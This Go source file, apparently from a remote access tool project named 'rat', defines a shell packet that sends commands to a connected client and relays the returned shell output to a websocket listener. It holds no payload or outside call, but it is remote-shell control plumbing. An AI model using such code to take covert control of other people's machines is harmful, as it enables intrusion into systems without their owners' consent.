package main

import (
	"rat/common"

	"golang.org/x/net/websocket"
)

type ShellPacket struct {
	Action  int
	Command string
}

func (packet ShellPacket) GetHeader() common.PacketHeader {
	return common.ShellHeader
}

func (packet ShellPacket) Write(c *Client) error {
	c.WriteInt(packet.Action)
	return c.WriteString(packet.Command)
}

func (packet ShellPacket) Read(c *Client) error {
	line, err := c.ReadString()

	if err != nil {
		return err
	}

	if ws, ok := c.Listeners[common.ShellHeader]; ok {
		event := newEvent(Shell, c.Id, line)

		err = websocket.JSON.Send(ws, &event)
	}

	return nil
}
